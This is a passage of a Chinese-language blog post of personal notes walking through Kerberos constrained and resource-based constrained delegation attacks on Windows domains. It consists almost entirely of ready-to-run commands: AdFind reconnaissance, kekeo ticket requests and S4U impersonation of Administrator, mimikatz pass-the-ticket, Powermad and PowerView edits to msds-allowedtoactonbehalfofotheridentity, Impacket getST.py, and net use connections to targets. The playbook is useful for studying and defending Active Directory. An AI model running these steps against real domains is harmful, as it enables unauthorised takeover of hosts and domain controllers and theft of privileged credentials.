<li><a href="/2024/11/14/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#%E5%AF%BC%E5%85%A5%E5%87%AD%E6%8D%AE">传送门</a></li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt &lt;file&gt;.kirbi</span><br></pre></td></tr></table></figure>

<h3 id="与目标建立连接"><a href="#与目标建立连接" class="headerlink" title="与目标建立连接"></a>与目标建立连接</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\&lt;ip&gt;\ipc$</span><br></pre></td></tr></table></figure>

<h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><h3 id="漏洞利用前提-1"><a href="#漏洞利用前提-1" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h3><ul>
<li><p>域控指定有委派权限的计算机</p>
<ul>
<li>域控的<code>服务管理器</code>-&gt;<code>Computers</code>-&gt;受害者计算机<code>委派</code>被设置为<code>仅信任此计算机来委派指定的服务</code>-&gt;<code>使用任何身份协议</code>-&gt;<code>添加</code>-&gt;<code>用户或计算机</code>-&gt;添加当前计算机-&gt;<code>添加服务</code>选择<code>cifs</code>-&gt;<code>确定</code></li>
</ul>
</li>
<li><p>域控指定有委派权限的用户</p>
<ul>
<li>域控的<code>服务管理器</code>-&gt;<code>Users</code>-&gt;受害者用户<code>委派</code>被设置为<code>仅信任此用户作为指定服务的委派</code>-&gt;<code>使用任何身份协议</code>-&gt;<code>添加</code>-&gt;<code>用户或计算机</code>-&gt;添加当前用户-&gt;<code>添加服务</code>选择<code>cifs</code>-&gt;<code>确定</code></li>
</ul>
</li>
</ul>
<h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><ul>
<li>查询域内设置了约束委派的用户账户</li>
</ul>
<blockquote>
<p><code>&quot;DC=example,DC=com&quot;</code>：指定域名前缀和后缀</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\AdFind.exe -b &quot;DC=example,DC=com&quot; -f &quot;(&amp;(samAccountType=<span class="number">805306368</span>)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dn:CN=&lt;username&gt;,CN=Users,DC=example,DC=com</span><br><span class="line">&gt;msDS-AllowedToDelegateTo: cifs/&lt;hostname&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>查询域内设置了约束委派的计算机账户</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\AdFind.exe -b &quot;DC=example,DC=com&quot; -f &quot;(&amp;(samAccountType=<span class="number">805306369</span>)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dn:CN=&lt;computername&gt;,CN=Computers,DC=example,DC=com</span><br><span class="line">&gt;msDS-AllowedToDelegateTo: cifs/&lt;hostname&gt;</span><br></pre></td></tr></table></figure>

<h3 id="通过kekeo获取用户凭据"><a href="#通过kekeo获取用户凭据" class="headerlink" title="通过kekeo获取用户凭据"></a>通过kekeo获取用户凭据</h3><ul>
<li><a href="/2024/11/14/kekeo%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#%E7%94%9F%E6%88%90%E5%87%AD%E6%8D%AE">传送门</a></li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo tgt::ask /domain:&lt;domain&gt; /user:&lt;username&gt; /password::&lt;password&gt; /ticket:administrator.kirbi</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo tgt::ask /domain:&lt;domain&gt; /user:&lt;username&gt; /ntlm:&lt;hash&gt; /ticket:administrator.kirbi</span><br></pre></td></tr></table></figure>

<h3 id="通过kekeo获取的用户凭据获取域控凭据"><a href="#通过kekeo获取的用户凭据获取域控凭据" class="headerlink" title="通过kekeo获取的用户凭据获取域控凭据"></a>通过kekeo获取的用户凭据获取域控凭据</h3><blockquote>
<p><code>/tgt:&lt;file&gt;.kirbi</code>：指定上一步获取的用户凭据文件<br><code>/user:Administrator@&lt;domain&gt;</code>：域控管理员用户名<br><code>/service:cifs/&lt;hostname&gt;</code>：指定上一步获取的服务名，可以是查询到的任意一个服务</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo tgs::s4u /tgt:&lt;file&gt;.kirbi /user:Administrator@&lt;domain&gt; /service:cifs/&lt;hostname&gt;</span><br></pre></td></tr></table></figure>

<h3 id="通过mimikatz导入凭据-1"><a href="#通过mimikatz导入凭据-1" class="headerlink" title="通过mimikatz导入凭据"></a>通过mimikatz导入凭据</h3><ul>
<li><a href="/2024/11/14/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#%E5%AF%BC%E5%85%A5%E5%87%AD%E6%8D%AE">传送门</a></li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt &lt;file&gt;.kirbi</span><br></pre></td></tr></table></figure>

<h3 id="与目标建立连接-1"><a href="#与目标建立连接-1" class="headerlink" title="与目标建立连接"></a>与目标建立连接</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\&lt;ip&gt;\ipc$</span><br></pre></td></tr></table></figure>

<h2 id="资源约束委派（PowerShell脚本）"><a href="#资源约束委派（PowerShell脚本）" class="headerlink" title="资源约束委派（PowerShell脚本）"></a>资源约束委派（PowerShell脚本）</h2><h3 id="漏洞利用前提-2"><a href="#漏洞利用前提-2" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h3><ul>
<li>域控是Windows2012及以上版本</li>
<li>存在域内用户加入域操作</li>
<li>如果多个域内主机加入域操作时采用同一个域用户登录，且如果得到这个域用户的权限，那么就可以得到所有用这个域用户加入域的主机的权限</li>
</ul>
<h3 id="poc-2"><a href="#poc-2" class="headerlink" title="poc"></a>poc</h3><ul>
<li>检测所有域内主机是否是由同一个域用户进行加入域操作的</li>
</ul>
<blockquote>
<p><code>&lt;ip&gt;</code>：域控主机IP地址</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\AdFind.exe -h &lt;ip&gt; -b &quot;DC=example,DC=com&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</span><br></pre></td></tr></table></figure>

<ul>
<li>得到所有域内主机加入域时登录的域用户</li>
</ul>
<blockquote>
<p><code>&lt;computername&gt;</code>：主机名<br><code>&lt;SID&gt;</code>：域用户SID</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dn:CN=&lt;computername&gt;,OU=Domain Controllers,DC=example,DC=com</span><br><span class="line"></span><br><span class="line">dn:CN=&lt;computername&gt;,CN=Computers,DC=example,DC=com</span><br><span class="line">&gt;mS-DS-CreatorSID: S-1-5-21-&lt;SID&gt;</span><br><span class="line"></span><br><span class="line">dn:CN=&lt;computername&gt;,CN=Computers,DC=example,DC=com</span><br><span class="line">&gt;mS-DS-CreatorSID: S-1-5-21-&lt;SID&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>如果所有域内主机加入域时登录的域用户都是<code>S-1-5-21-&lt;SID&gt;</code>，则可以进行漏洞利用得到所有加入域时使用这个域用户登录的主机的权限</li>
<li>获取这些主机的主机名</li>
</ul>
<h3 id="获取域用户SID对应的用户名"><a href="#获取域用户SID对应的用户名" class="headerlink" title="获取域用户SID对应的用户名"></a>获取域用户SID对应的用户名</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\sid2user.exe \\&lt;ip&gt; <span class="number">5</span> <span class="number">21</span> <span class="number">0000000000</span> <span class="number">0000000000</span> <span class="number">0000000000</span> <span class="number">0000</span></span><br></pre></td></tr></table></figure>

<h3 id="添加域计算机账户"><a href="#添加域计算机账户" class="headerlink" title="添加域计算机账户"></a>添加域计算机账户</h3><h4 id="通过PowerShell脚本"><a href="#通过PowerShell脚本" class="headerlink" title="通过PowerShell脚本"></a>通过PowerShell脚本</h4><h5 id="以普通域用户权限添加域计算机账户"><a href="#以普通域用户权限添加域计算机账户" class="headerlink" title="以普通域用户权限添加域计算机账户"></a>以普通域用户权限添加域计算机账户</h5><ul>
<li>已经取得普通域用户权限</li>
</ul>
<h6 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Kevin<span class="literal">-Robertson</span>/Powermad.git</span><br><span class="line"><span class="built_in">cd</span> Powermad</span><br></pre></td></tr></table></figure>

<h6 id="允许执行PowerShell脚本（可选）"><a href="#允许执行PowerShell脚本（可选）" class="headerlink" title="允许执行PowerShell脚本（可选）"></a>允许执行PowerShell脚本（可选）</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> ByPass <span class="literal">-Scope</span> <span class="keyword">Process</span></span><br></pre></td></tr></table></figure>

<h6 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\Powermad.ps1</span><br></pre></td></tr></table></figure>

<h6 id="添加域计算机账户-1"><a href="#添加域计算机账户-1" class="headerlink" title="添加域计算机账户"></a>添加域计算机账户</h6><blockquote>
<p><code>&lt;computername&gt;</code>：定义计算机账户名<br><code>&lt;password&gt;</code>：定义计算机账户密码</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-MachineAccount</span> <span class="literal">-MachineAccount</span> &lt;computername&gt; <span class="literal">-Password</span> <span class="variable">$</span>(<span class="built_in">ConvertTo-String</span> <span class="string">&quot;&lt;password&gt;&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>)</span><br></pre></td></tr></table></figure>

<h5 id="获取新计算机账户的SID值"><a href="#获取新计算机账户的SID值" class="headerlink" title="获取新计算机账户的SID值"></a>获取新计算机账户的SID值</h5><h6 id="下载项目-1"><a href="#下载项目-1" class="headerlink" title="下载项目"></a>下载项目</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> https://github.com/PowerShellMafia/PowerSploit/archive/refs/tags/v3.<span class="number">0.0</span>.zip <span class="literal">-OutFile</span> v3.<span class="number">0.0</span>.zip</span><br><span class="line"><span class="built_in">Expand-Archive</span> <span class="literal">-Path</span> v3.<span class="number">0.0</span>.zip <span class="literal">-DestinationPath</span> <span class="string">&quot;PowerSploit-3.0.0&quot;</span></span><br><span class="line"><span class="built_in">cd</span> PowerSploit<span class="literal">-3</span>.<span class="number">0.0</span></span><br></pre></td></tr></table></figure>

<h6 id="允许执行PowerShell脚本（可选）-1"><a href="#允许执行PowerShell脚本（可选）-1" class="headerlink" title="允许执行PowerShell脚本（可选）"></a>允许执行PowerShell脚本（可选）</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> ByPass <span class="literal">-Scope</span> <span class="keyword">Process</span></span><br></pre></td></tr></table></figure>

<h6 id="引入依赖-1"><a href="#引入依赖-1" class="headerlink" title="引入依赖"></a>引入依赖</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\Recon\PowerView.ps1</span><br></pre></td></tr></table></figure>

<h6 id="获取新计算机账户的SID值-1"><a href="#获取新计算机账户的SID值-1" class="headerlink" title="获取新计算机账户的SID值"></a>获取新计算机账户的SID值</h6><blockquote>
<p><code>&lt;computername&gt;</code>：上一步骤定义的计算机账户名</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-NetComputer</span> &lt;computername&gt; <span class="literal">-Properties</span> objectsid</span><br></pre></td></tr></table></figure>

<h5 id="修改上一步骤添加的计算机账户属性"><a href="#修改上一步骤添加的计算机账户属性" class="headerlink" title="修改上一步骤添加的计算机账户属性"></a>修改上一步骤添加的计算机账户属性</h5><h6 id="下载项目-2"><a href="#下载项目-2" class="headerlink" title="下载项目"></a>下载项目</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Kevin<span class="literal">-Robertson</span>/Powermad.git</span><br><span class="line"><span class="built_in">cd</span> Powermad</span><br></pre></td></tr></table></figure>

<h6 id="允许执行PowerShell脚本（可选）-2"><a href="#允许执行PowerShell脚本（可选）-2" class="headerlink" title="允许执行PowerShell脚本（可选）"></a>允许执行PowerShell脚本（可选）</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> ByPass <span class="literal">-Scope</span> <span class="keyword">Process</span></span><br></pre></td></tr></table></figure>

<h6 id="引入依赖-2"><a href="#引入依赖-2" class="headerlink" title="引入依赖"></a>引入依赖</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\Powermad.ps1</span><br></pre></td></tr></table></figure>

<h6 id="修改上一步骤添加的计算机账户属性-1"><a href="#修改上一步骤添加的计算机账户属性-1" class="headerlink" title="修改上一步骤添加的计算机账户属性"></a>修改上一步骤添加的计算机账户属性</h6><blockquote>
<p><code>&lt;sid&gt;</code>：上一步骤得到的新的计算机账户的SID，也就是需要修改属性的计算机账户<br><code>&lt;computername_target&gt;</code>：被攻击的目标计算机账户名，也就是相同被相同账户添加到域的主机</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="literal">-ArgumentList</span> <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&lt;sid&gt;)&quot;</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">Get-DomainComputer</span> &lt;computername_target&gt; | <span class="built_in">Set-DomainObject</span> <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="variable">$SDBytes</span>&#125; <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<h6 id="验证是否修改成功（可选）"><a href="#验证是否修改成功（可选）" class="headerlink" title="验证是否修改成功（可选）"></a>验证是否修改成功（可选）</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainComputer</span> &lt;computername_target&gt; <span class="literal">-Properties</span> msds<span class="literal">-allowedtoactonbehalfofotheridentity</span></span><br></pre></td></tr></table></figure>

<h6 id="清除修改的属性（可选）"><a href="#清除修改的属性（可选）" class="headerlink" title="清除修改的属性（可选）"></a>清除修改的属性（可选）</h6><ul>
<li>用于修改有误时，先清除已经修改的属性，再重新修改属性</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-DomainObject</span> &lt;computername_target&gt; <span class="literal">-Clear</span> <span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<h4 id="通过HPVCA-SharpAllowedToAct"><a href="#通过HPVCA-SharpAllowedToAct" class="headerlink" title="通过HPVCA&#x2F;SharpAllowedToAct"></a>通过HPVCA&#x2F;SharpAllowedToAct</h4><h5 id="以普通用户权限添加计算机账户"><a href="#以普通用户权限添加计算机账户" class="headerlink" title="以普通用户权限添加计算机账户"></a>以普通用户权限添加计算机账户</h5><h6 id="下载项目-3"><a href="#下载项目-3" class="headerlink" title="下载项目"></a>下载项目</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/HPVCA/SharpAllowedToAct.git</span><br><span class="line">cd SharpAllowedToAct</span><br></pre></td></tr></table></figure>

<h6 id="编译DotNet项目"><a href="#编译DotNet项目" class="headerlink" title="编译DotNet项目"></a>编译DotNet项目</h6><ul>
<li><p>通过 Visual Studio 打开<code>SharpAllowedToAct/SharpAllowedToAct.sln</code>项目</p>
</li>
<li><p>生成解决方案</p>
</li>
<li><p>得到<code>SharpAllowedToAct\SharpAllowedToAct\bin\Release\SharpAllowedToAct.exe</code>可执行文件</p>
</li>
</ul>
<h6 id="以普通用户权限添加计算机账户-1"><a href="#以普通用户权限添加计算机账户-1" class="headerlink" title="以普通用户权限添加计算机账户"></a>以普通用户权限添加计算机账户</h6><blockquote>
<p><code>&lt;conputername&gt;</code>：新创建的计算机账户名<br><code>&lt;conputerpassword&gt;</code>：新创建的计算机账户密码<br><code>&lt;conputername_current&gt;</code>：当前的计算机账户名<br><code>&lt;ip_domain_controller&gt;</code>：域控IP地址<br><code>&lt;domain_name&gt;</code>：域名</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\SharpAllowedToAct.exe -m &lt;conputername&gt; -p &lt;conputerpassword&gt; -t &lt;coputername_current&gt; -a &lt;ip_domain_controller&gt; &lt;domain_name&gt;</span><br></pre></td></tr></table></figure>

<h3 id="通过Impacket生成凭据"><a href="#通过Impacket生成凭据" class="headerlink" title="通过Impacket生成凭据"></a>通过Impacket生成凭据</h3><ul>
<li><a href="/2024/11/04/Impacket%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">传送门</a></li>
</ul>
<blockquote>
<p><code>-dc-ip &lt;ip&gt;</code>：指定域控IP地址</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 examples/getST.py <span class="literal">-impersonate</span> Administrator <span class="literal">-spn</span> cifs/&lt;computername_target&gt;.&lt;domain&gt; <span class="literal">-dc-ip</span> &lt;ip&gt; &lt;domain&gt;/&lt;computername&gt;\<span class="variable">$</span>:&lt;password&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>生成凭据文件<code>Administrator.ccache</code></li>
</ul>
<h3 id="通过mimikatz导入凭据-2"><a href="#通过mimikatz导入凭据-2" class="headerlink" title="通过mimikatz导入凭据"></a>通过mimikatz导入凭据</h3><ul>
<li><a href="/2024/11/14/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">传送门</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptc Administrator.ccache</span><br></pre></td></tr></table></figure>

<h3 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\&lt;computername_target&gt;.&lt;domain&gt;\ipc<span class="variable">$</span></span><br></pre></td></tr></table></figure>

<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>
    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div><svg class="coin" width="28" height="28" viewBox="0 0 28 28" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.045 25.5454C7.69377 25.5454 2.54504 20.3967 2.54504 14.0454C2.54504 7.69413 7.69377 2.54541 14.045 2.54541C20.3963 2.54541 25.545 7.69413 25.545 14.0454C25.545 17.0954 24.3334 20.0205 22.1768 22.1771C20.0201 24.3338 17.095 25.5454 14.045 25.5454ZM9.66202 6.81624H18.2761C18.825 6.81624 19.27 7.22183 19.27 7.72216C19.27 8.22248 18.825 8.62807 18.2761 8.62807H14.95V10.2903C17.989 10.4444 20.3766 12.9487 20.3855 15.9916V17.1995C20.3854 17.6997 19.9799 18.1052 19.4796 18.1052C18.9793 18.1052 18.5738 17.6997 18.5737 17.1995V15.9916C18.5667 13.9478 16.9882 12.2535 14.95 12.1022V20.5574C14.95 21.0577 14.5444 21.4633 14.0441 21.4633C13.5437 21.4633 13.1382 21.0577 13.1382 20.5574V12.1022C11.1 12.2535 9.52148 13.9478 9.51448 15.9916V17.1995C9.5144 17.6997 9.10883 18.1052 8.60856 18.1052C8.1083 18.1052 7.70273 17.6997 7.70265 17.1995V15.9916C7.71158 12.9487 10.0992 10.4444 13.1382 10.2903V8.62807H9.66202C9.11309 8.62807 8.66809 8.22248 8.66809 7.72216C8.66809 7.22183 9.11309 6.81624 9.66202 6.81624Z" fill="currentColor"></path></svg></div>
  <button>
    储钱罐
  </button>
  <div class="post-reward">
      <div>
        <img src="/assets/images/reward/images/wxpay.png" alt="57uv6Z6g 微信支付">
        <span>微信支付</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/alipay.png" alt="57uv6Z6g 支付宝">
        <span>支付宝</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/qqpay.png" alt="57uv6Z6g qqpay">
        <span>qqpay</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/bitcoin.png" alt="57uv6Z6g 比特币">
        <span>比特币</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/ethereum.png" alt="57uv6Z6g ethereum">
        <span>ethereum</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/monero.png" alt="57uv6Z6g monero">
        <span>monero</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/paypal.png" alt="57uv6Z6g 贝宝">
        <span>贝宝</span>
      </div>

  </div>
</div>

          <div class="post-tags">
              <a href="/tags/Windows/" rel="tag"># Windows</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/11/20/%E5%B7%B2%E4%B8%8A%E7%BA%BF%E7%9A%84Windows%E4%B8%BB%E6%9C%BA%E4%BB%8ESYSTEM%E7%94%A8%E6%88%B7%E5%88%87%E6%8D%A2%E5%88%B0%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7/" rel="prev" title="【笔记】已上线的Windows主机从SYSTEM用户切换到其他用户">
                  <i class="fa fa-angle-left"></i> 【笔记】已上线的Windows主机从SYSTEM用户切换到其他用户
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/11/20/%E9%80%9A%E8%BF%87Docker%E9%83%A8%E7%BD%B2%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/" rel="next" title="【笔记】通过Docker部署百度网盘">
                  【笔记】通过Docker部署百度网盘 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments"><div id="twikoo-comments"></div></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2019 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">57uv6Z6g</span>
  </div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>
<div id="site-time"></div>


<div id="current-visitors-count"></div>


<div id="site-badge"></div>


<div id="loading-door-left"></div>
<div id="loading-door-right"></div>
<a id="loading-door-a" href="javascript:loadingDoorOpen();">芝麻开门</a>


<div id="waifu">
  <div id="waifu-tips"></div>
  <canvas id="live2d" width="800" height="800"></canvas>
</div>
<div id="waifu-toggle">
  <span>看板娘</span>
</div>


<link rel="stylesheet" href="/dist/bundle.css">


<script src="/dist/bundle.js"></script>


    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>
<script class="next-config" data-name="twikoo" type="application/json">{"enable":true,"visitor":false,"envId":"https://twikoo.loli.fj.cn","jsUrl":"https://unpkg.com/twikoo@1.6.44/dist/twikoo.min.js","el":"#twikoo-comments"}</script>
<script>
document.addEventListener('page:loaded', () => {
  NexT.utils.loadComments(CONFIG.twikoo.el)
    .then(() => NexT.utils.getScript(
      CONFIG.twikoo.jsUrl || 'https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js',
      { condition: window.twikoo }
    ))
    .then(() => {
      twikoo.init(CONFIG.twikoo);
    });
});
</script>
<style>
.post-block, .comments {
  overflow: visible;
}
.tk-owo-emotion {
  display: inline-block;
}
</style>

</body>
</html>
